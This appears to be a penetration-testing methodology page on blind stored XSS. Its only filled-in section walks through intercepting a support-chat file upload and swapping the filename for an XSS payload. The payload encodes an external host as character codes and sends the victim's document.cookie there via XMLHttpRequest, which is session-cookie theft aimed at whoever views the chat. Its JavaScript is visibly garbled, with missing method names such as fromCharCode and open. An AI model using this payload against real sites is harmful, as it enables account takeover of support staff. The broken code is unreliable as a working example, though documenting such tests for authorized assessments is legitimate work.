# Stored Cross Site Scripting

## Check List

## Methodology

### Black Box

#### Blind XSS

{% stepper %}
{% step %}
Set up an HTTP/HTTPS proxy (e.g., Burp Suite) and enable Intercept
{% endstep %}

{% step %}
Open the target support/chat interface and start uploading a file to the chat
{% endstep %}

{% step %}
When the upload request is captured, pause it in the proxy (Intercept)
{% endstep %}

{% step %}
Modify the filename field in the intercepted upload request to the exact string below

```javascript
"><img src=1 onerror="url=String104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp'GET',url,true;xhttp'send';
```
{% endstep %}

{% step %}
Forward the modified request so the file with the altered filename appears in the chat
{% endstep %}

{% step %}
Open or refresh the support chat page; when the filename containing the payload is rendered, the XSS should trigger
{% endstep %}
{% endstepper %}

### White Box

## Cheat Sheet
